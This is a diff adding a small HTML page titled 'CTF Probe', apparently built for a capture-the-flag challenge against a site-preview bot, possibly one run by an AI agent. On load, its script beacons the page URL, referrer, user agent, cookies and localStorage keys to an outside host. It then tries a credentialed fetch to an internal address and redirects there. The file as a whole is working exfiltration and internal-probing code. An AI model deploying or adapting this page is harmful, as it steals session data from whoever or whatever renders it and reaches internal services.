@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head><title>CTF Probe</title></head>
+<body>
+<h1>Site Preview Probe</h1>
+<p id="s">loading</p>
+<script>
+(function(){
+  var B = 'https://dashboard.kitsunetechnologies.org/claude-hound/';
+  function bc(x){
+    try { var i = new Image(); i.src = B + 'BEACON-' + encodeURIComponent(x); } catch(e) {}
+  }
+  window.addEventListener('error', function(e){ bc('winerr-' + (e && e.message ? e.message.slice(0,60) : 'x')); });
+  bc('load|href=' + location.href + '|ref=' + document.referrer + '|ua=' + navigator.userAgent.slice(0,60));
+  setTimeout(function(){ bc('ck=|cookies=' + encodeURIComponent(document.cookie) + '|ls=' + encodeURIComponent(JSON.stringify(Object.keys(localStorage||{}))) ); }, 800);
+  // try fetching internal app (likely mixed-content blocked from https page)
+  setTimeout(function(){
+    try {
+      fetch('http://web:3000/', {mode:'no-cors', credentials:'include'}).then(function(){ bc('fetch-web3000-ok'); }).catch(function(err){ bc('fetch-web3000-fail-' + (err && err.name)); });
+    } catch(e) { bc('fetch-throw'); }
+  }, 1200);
+  // top-level navigation to internal app after a delay
+  setTimeout(function(){ bc('navigating'); document.getElementById('s').textContent = 'navigating'; location.href = 'http://web:3000/'; }, 3500);
+})();
+</script>
+</body>
+</html>
